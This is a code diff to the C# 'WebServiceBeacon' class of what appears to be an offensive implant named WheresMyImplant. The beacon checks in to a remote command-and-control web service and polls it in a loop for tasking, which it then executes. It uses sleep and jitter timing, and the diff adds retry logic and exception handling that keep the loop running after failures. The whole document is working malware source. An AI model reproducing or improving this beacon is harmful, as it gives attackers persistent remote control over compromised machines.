@@ -10,7 +10,6 @@ namespace WheresMyImplant
 
     class WebServiceBeacon : IDisposable
     {
-        private ChannelFactory<IServiceBeaconEndpoint> channelFactory;
         private Dictionary<String, BeaconTask> task = new Dictionary<String, BeaconTask>();
 
         private String uuid = null;
@@ -19,6 +18,9 @@ namespace WheresMyImplant
 
         private Int32 sleep = 5;
         private Int32 jitter = 2;
+
+        private static Double retriesIncrementerLimit = 1000.00;
+        private Double retriesIncrementer = 200.00;
 
         ////////////////////////////////////////////////////////////////////////////////
         //new NetTcpBinding(),
@@ -85,30 +87,52 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
+        internal void SetRetries(Int32 retries)
+        {
+            if (0 == retries)
+            {
+                retriesIncrementer = 0;
+                return;
+            }
+            retriesIncrementer = retriesIncrementerLimit / retries;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
         internal void Run()
         {
             String url = String.Format("http://{0}/{1}", socket, provider);
-            Console.WriteLine(url);
             GenerateUuid(8);
-            Console.WriteLine(uuid);
             if (!WebServiceBeaconComs.Checkin(url, uuid))
             {
                 return;
             }
 
-            while (true)
+            Double incrementer = 0;
+            while (retriesIncrementerLimit > incrementer)
             {
-                String output = "";
-                if (!WebServiceBeaconComs.InvokeRequest(url, "TaskingRequest", new String[] { uuid }, ref output))
+                try
                 {
-                    return;
+                    String output = "";
+                    if (!WebServiceBeaconComs.InvokeRequest(url, "TaskingRequest", new String[] { uuid }, ref output))
+                    {
+                        Console.WriteLine("{0}/{1}", incrementer, retriesIncrementerLimit);
+                        incrementer += retriesIncrementer;
+                    }
+                    if ("" != output)
+                    {
+                        BeaconTask task = new BeaconTask(output, uuid, url);
+                    }
                 }
-                if ("" != output)
+                catch (Exception error)
                 {
-                    BeaconTask task = new BeaconTask(output, uuid, url);
-
+                    Console.WriteLine(error);
                 }
-                Thread.Sleep((sleep * 1000) + (new Random().Next(0, jitter) * 1000));
+                finally
+                {
+                    Thread.Sleep((sleep * 1000) + (new Random().Next(0, jitter) * 1000));
+                }
             }
         }
 
@@ -117,14 +141,6 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         public void Dispose()
         {
-            try
-            {
-                channelFactory.Close();
-            }
-            catch (NullReferenceException)
-            {
-                Console.WriteLine("Already closed");
-            }
         }
     }
 }
